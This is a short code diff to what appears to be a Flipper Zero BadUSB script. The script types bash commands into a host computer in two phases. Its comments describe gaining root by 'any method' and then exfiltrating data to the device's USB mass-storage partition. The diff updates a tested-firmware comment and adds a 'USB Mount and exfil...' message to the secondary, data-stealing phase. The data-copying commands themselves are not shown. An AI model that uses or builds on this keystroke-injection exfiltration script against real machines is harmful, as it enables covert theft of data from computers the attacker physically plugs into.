@@ -15,7 +15,7 @@
 // Execution example would be handled in multiple phases: primary and secondary.
 // Primary phase will execute some commands, secondary phase will be used for exfiltrating data.
 //
-// ************ Tested on Momentum Firmware Dev Build d81e72d (April 9, 2024) ************
+// ************ Tested on Momentum Firmware Dev Build 6608b896 (April 10, 2024) ************
 //
 // Example - Environment: Linux
 // - Primary Phase: Elevate privledges to root utilizing any method you wish
@@ -67,7 +67,7 @@ let primary = [
 //
 // 'command' is required, 'message' and 'delay' are optional
 let secondary = [
-    { command: "bash -c '", delay: 10 },
+    { message: "USB Mount and exfil...", command: "bash -c '", delay: 10 },
     { command: "img=" + imageName + ";", delay: 10 },
     { command: "disk=/dev/disk/by-id/usb-Flipper_Mass_Storage_$img-0:0;", delay: 10 },
     { command: "part=$disk-part1;", delay: 10 },
